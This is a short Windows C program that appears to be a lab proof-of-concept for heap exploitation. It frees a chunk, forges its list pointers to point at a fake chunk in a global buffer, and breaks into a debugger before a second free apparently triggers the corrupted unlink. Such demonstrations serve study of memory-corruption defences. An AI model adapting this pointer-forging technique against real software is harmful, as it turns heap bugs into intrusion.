#include <windows.h>
#include <stdio.h>

unsigned char buf[0x100];
int main()
{
    PVOID p0,p1,p2,p3,p4,p5,p6,p7,p8;
    HANDLE hp=HeapCreate(HEAP_NO_SERIALIZE,0x1000,0x10000);
    
    p1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    p2=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    HeapAlloc(hp,HEAP_ZERO_MEMORY,4);
    HeapAlloc(hp,HEAP_ZERO_MEMORY,4);

    HeapFree(hp,HEAP_NO_SERIALIZE,p1);

    unsigned char* ptr;
    ptr=buf;
    *(unsigned int*)ptr=*(unsigned int*)((unsigned char*)hp+0x50);
    ptr=ptr+12;
    *(unsigned int*)ptr=(unsigned int)p1;
    *(unsigned int*)(ptr+4)=(unsigned int)p1;
    ptr=(unsigned char*)p1;
    *(unsigned int*)ptr=(unsigned int)buf+8;
    *(unsigned int*)(ptr+4)=(unsigned int)buf+12;


    __asm int 3

    HeapFree(hp,HEAP_NO_SERIALIZE,p2);

    return 0;
}
